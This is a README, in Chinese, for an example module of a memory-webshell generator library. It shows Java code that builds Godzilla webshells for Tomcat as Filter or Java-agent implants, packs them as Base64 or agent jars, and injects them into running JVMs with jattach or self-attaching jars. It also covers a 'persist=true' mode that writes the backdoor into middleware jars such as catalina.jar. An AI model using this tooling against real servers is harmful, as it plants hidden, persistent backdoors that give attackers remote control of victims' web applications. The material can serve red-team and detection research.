# memshell-party-example-memshell

演示 `MemShellGenerator` 的用法：先查支持矩阵，再用强类型或动态参数生成内存马；
重点看 Godzilla 内存马与 **Agent 内存马**（Java Agent Jar）怎么生成、怎么投递。

真实容器上的注入/连接验证见 `integration-test`（如 `Tomcat8ContainerTest` 的
`AGENT_FILTER_CHAIN` 用例），本示例只锁生成期契约，跑得快、不依赖外部环境。

## 依赖

生成内存马要三样东西：生成引擎、目标 server 的注入器、工具本身。

```kotlin
dependencies {
    implementation("io.github.reajason:memshell-party-core:<version>")            // MemShellGenerator
    implementation("io.github.reajason:memshell-party-packer:<version>")          // 打包/投递
    implementation("io.github.reajason:memshell-party-server-tomcat:<version>")   // 本示例的目标容器
    implementation("io.github.reajason:memshell-party-shelltool-godzilla:<version>")
}
```

仓库内开发时用 `project(":...")`，见本模块 `build.gradle.kts`。换目标容器/工具就换后两个依赖，
`MemShellGenerator` 的调用不变。

## 入口类

| main | 演示内容 |
|---|---|
| `Capabilities` | 支持矩阵查询：`getShellTypeCatalog()` 按服务端/工具/类型查询，`ToolConfigFactory.describeAll()` 列出工具参数 |
| `GodzillaFilter` | 强类型写法：`ShellConfig` + `InjectorConfig` + `GodzillaConfig` 生成 Tomcat Filter，并 Base64 打包 |
| `DynamicParams` | 动态参数写法（GUI / REST / MCP 同一条路径）：`Map<String, String>` 绑定到工具 config |
| `AgentMemShell` | Agent 内存马：生成 `AgentFilterChain`，落盘纯 Agent Jar 与自带 Attacher 的 Agent Jar |

## 生成三步

```java
MemShellResult result = new MemShellGenerator().generate(
        ShellConfig.builder()
                .server(Server.Tomcat)          // 目标容器
                .shellTool(ShellTool.Godzilla)  // 工具协议
                .shellType(ShellType.FILTER)    // 挂载类型：Filter/Servlet/Listener/Valve/WebSocket/Agent...
                .build(),
        InjectorConfig.builder()
                .urlPattern("/*")               // 不传由生成器补 "/*"
                .build(),
        GodzillaConfig.builder()
                .pass("pass")
                .key("key")
                .headerName("User-Agent")
                .headerValue("Mozilla/5.0")
                .build());
```

生成器会补齐缺省值（`serverVersion=unknown`、`targetJreVersion=Java 6`、随机类名等），
再把配置写进 shell 类字段：

- `result.getShellBytes()` / `getInjectorBytes()`：shell 与注入器字节；
- `result.getShellBytesBase64Str()` / `getInjectorBytesBase64Str()`：对应的 Base64；
- `result.getShellToolConfig()`：实际使用的工具配置（含随机默认值）；
- `result.getShellConfig()` / `getInjectorConfig()`：补齐默认值后的配置。

投递编码交给 packer：`PackerRegistry.getInstance().pack(Packers.DefaultBase64, result)`。
可用的打包方式由 `PackerRegistry.getInstance().getNames()` 列出（JSP、BCEL、ScriptEngine、
反序列化、AgentJar……），GUI 的「打包方式」下拉框用的是同一份目录。

## 先查再做

```java
MemShellGenerator.ShellTypeCatalog catalog = new MemShellGenerator().getShellTypeCatalog();
catalog.getServers();                                  // 有可生成组合的服务端
catalog.getServersSupporting(ShellTool.Godzilla);      // 能跑该工具的服务端
catalog.getShellTools(Server.Tomcat);                  // 该服务端能用的工具
catalog.getShellTypes(Server.Tomcat, ShellTool.Godzilla); // 该组合能生成的挂载类型
```

矩阵已经对「server 的注入器映射 × 工具的 shellType 映射」求过交集：没有注入器的组合不会出现。
不存在的服务端/工具/组合返回空表，不会返回 `null`。

## 动态参数（GUI / REST / MCP）

参数名就是工具 config 上 `@ConfigField` 的字段名，另加一个生成期参数 `shellClassName`：

```java
Map<String, String> params = new LinkedHashMap<>();
params.put("pass", "pass");
params.put("key", "key");
params.put("headerValue", "Mozilla/5.0");
params.put("shellClassName", "com.example.memshell.DemoGodzilla");

MemShellResult result = new MemShellGenerator().generate(shellConfig, injectorConfig, params);
```

留空的值跳过，保持 builder 默认值（随机 pass/key 等）；不认识的参数名直接抛
`GenerationException` 并列出可用参数。工具参数目录（名称/类型/标签/占位提示）用
`ToolConfigFactory.describeAll()` 取，GUI 动态表单和 MCP schema 都基于它。

## Godzilla 内存马

- 生成：`shellTool=Godzilla`，`shellType` 从矩阵里选（普通场景 `Filter` / `Servlet` / `Valve`，Jakarta 容器用 `JakartaFilter` 等）。
- 连接：把注入器投递并触发后，Godzilla 客户端填 `pass`、`key`，请求头 `headerName: headerValue`。
- 协议常量：shell 里写入的 `key` 是 `md5(key)[0:16]`；`md5` 是 `md5(pass + md5Key)` 的 32 位大写形式，
  回包用它的前 16 / 后 16 位做标记。客户端按同样规则计算，所以 `GodzillaConfig` 里传的是原始 `key` / `pass`。

## Agent 内存马

Agent 类型不经过应用注册 Filter/Servlet，而是把 `ClassFileTransformer` 装进目标 JVM：

- `ShellType.AGENT_FILTER_CHAIN`：改写 `org.apache.catalina.core.ApplicationFilterChain#doFilter`，
  请求进入 FilterChain 时先经过改写后的方法；命中请求头后执行 shell。不需要 `urlPattern`。
- `ShellType.CATALINA_AGENT_CONTEXT_VALVE`：改写 Context Valve，同样由 `Tomcat` 的注入器映射提供。

生成方式只有 `shellType` 不同：

```java
ShellConfig.builder()
        .server(Server.Tomcat)
        .shellTool(ShellTool.Godzilla)
        .shellType(ShellType.AGENT_FILTER_CHAIN)
        .build();
```

注入器类带 `premain` / `agentmain`，产物有三种打包方式：

| packer | 形态 | 投递 |
|---|---|---|
| `Packers.AgentJar` | 纯 Agent Jar，无 `Main-Class` | `jattach <pid> load instrument false agent.jar` |
| `Packers.AgentJarWithJREAttacher` | 带 `Main-Class`，内置 JNA Attacher | `java -jar agent.jar <pid>` 或 `java -jar agent.jar all` |
| `Packers.AgentJarWithJDKAttacher` | 带 `Main-Class`，走目标的 `com.sun.tools.attach` | 同上；jar 更小，但目标需要 tools.jar / jdk.attach |

两个 Attacher 变体依赖生成端的 JNA（`memshell-party-packer` 默认带上）；生成端 exclude 掉 JNA 时，
它们不会出现在打包方式目录里。

`AgentMemShell` 会把 `AgentJar` 与 `AgentJarWithJREAttacher` 的 Base64 解码后落盘，直接打印两条投递命令。
Jar 内容由 packer 生成：`Agent-Class` / `Premain-Class` 指向生成的注入器类，
`Can-Redefine-Classes` / `Can-Retransform-Classes` 为 `true`，ASM 依赖重定位到 `shade/org/objectweb/asm/`，
不会和目标应用的 ASM 撞包。

> 注入是否成功取决于目标环境：进程属主需一致，JVM 未开启 `-XX:+DisableAttachMechanism`。
> 用 JDK Attacher 变体时，目标还要有 `tools.jar`（JDK 8）或 `jdk.attach` 模块（JDK 9+）；
> 纯 `AgentJar` 由 jattach 从外部加载，不依赖目标 JVM 的 attach API。

### Agent 持久化与还原

Tomcat、BES、TongWeb、Apusic、Jetty、Resin、Undertow、WebLogic、WebSphere 的 Agent 注入类型
支持 Agent 参数 `persist=true`，包括复用这些 injector 的 JBoss、GlassFish/Payara、InforSuite、
WildFly/JBoss EAP、OpenLiberty：

```bash
# 纯 AgentJar
jattach <pid> load instrument false /path/to/agent.jar=persist=true

# 带 Attacher 的 AgentJar；all 后也可以追加相同参数
java -jar /path/to/agent.jar <pid> persist=true
```

注入器会把目标类和 shell 类写入实际加载该类的中间件 jar，并将原始包备份为
`/tmp/<原始jar文件名>.bak`。已有备份时会拒绝再次持久化，避免覆盖干净备份。
目标类必须已经加载；支持普通 jar（包括 `jar:file:` 和 JBoss `vfs:` CodeSource），不支持 Spring Boot nested jar 或解压目录。
运行用户必须能写目标 jar 及其所在目录，并在 `/tmp` 创建备份。
成功日志会打印实际备份路径和还原命令。

停止中间件后，将备份复制回实际原包路径，再启动中间件：

```bash
cp -p "/tmp/<原始jar文件名>.bak" "/实际/原始jar路径"
```

例如 Tomcat 的原包为 `$CATALINA_HOME/lib/catalina.jar`：

```bash
cp -p /tmp/catalina.jar.bak "$CATALINA_HOME/lib/catalina.jar"
```

## 运行测试

```
./gradlew :memshell-party-examples:memshell-party-example-memshell:test
```

- `godzillaFilterWritesConfiguredFields`：强类型配置写进 shell 静态字段（pass/key/md5/header），默认值补齐；
- `dynamicParamsBindToToolConfig` / `blankDynamicParamsKeepBuilderDefaults` / `unknownDynamicParamIsRejected`：
  动态参数绑定、留空走默认、未知参数报错；
- `unsupportedCombinationIsRejected`：矩阵外的组合抛 `GenerationException`；
- `capabilityCatalogAnswersByAxis`：查询 API 的返回值契约；
- `agentFilterChainPackagesPureAgentJar` / `agentFilterChainPackagesSelfAttachingJar`：
  Agent Jar 的 MANIFEST、类条目、ASM 重定位与 Attacher 入口。
